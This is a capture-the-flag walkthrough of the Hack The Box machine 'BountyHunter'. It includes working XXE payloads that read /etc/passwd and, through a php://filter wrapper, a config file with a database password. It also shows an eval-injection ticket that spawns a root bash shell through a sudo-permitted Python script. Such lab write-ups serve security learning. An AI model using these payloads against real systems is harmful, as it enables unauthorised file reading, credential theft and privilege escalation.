# BountyHunter

Completed: Yes Created: August 5, 2021 12:13 AM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

Found `/resources/README.txt` with:

```bash
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

log\_submit.php sends actually base64 and URL encoded XML data:

```bash
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 315
Origin: http://10.10.11.100
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbPCFFTlRJVFkgdGVzdCBTWVNURU0gJ2ZpbGU6Ly8vZXRjL3Bhc3N3ZCc%2bXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4mdGVzdDs8L3RpdGxlPgoJCTxjd2U%2bdGVzdDwvY3dlPgoJCTxjdnNzPnRlc3Q8L2N2c3M%2bCgkJPHJld2FyZD50ZXN0PC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b
```

So, I send it XML data with XXE and got:

```bash
HTTP/1.1 200 OK
Date: Wed, 04 Aug 2021 21:54:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2102
Connection: close
Content-Type: text/html; charset=UTF-8

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>test</td>
  </tr>
</table>
```

## Gaining access

Now, the vulnerability is very straightforward. All we have to do is to determine the way of getting access to the machine. Okay, I tried some things with SSRF and tried to include my file within. But it was a stupid idea. I had to use PHP wrappers at the beginning. Now, I used data with base64 encoded, but it doesn't give me an opportunity to insert PHP code and execute reverse shell. Okay, but I can use PHP wrapper something like that:

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE bugreport [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

With this I got db.php and decoded it and got password, which gives access to `development` user.

```bash
cat db.php                             
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

## Privilege escalation

Check a note and sudo:

```bash
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

You can see the source code, but can't modify it. So, the main work here is to explore the code and find a vector to privesc. This one is easy. It is an eval function, where we can put some code like \*\*`import**('os').system('ls')` and got execution of ls command. All you have to do is to pass all conditions and reach eval function. Moreover you can see that the ticketNumber is valid when it has mod 4 of 7 and it also splits the string with + sign, so, the result payload will be next:

```bash
cat pwn.md                       
# Skytrain Inc
## Ticket to HACKER 
__Ticket Code:__
**18+__import__('os').system('/bin/bash')
```
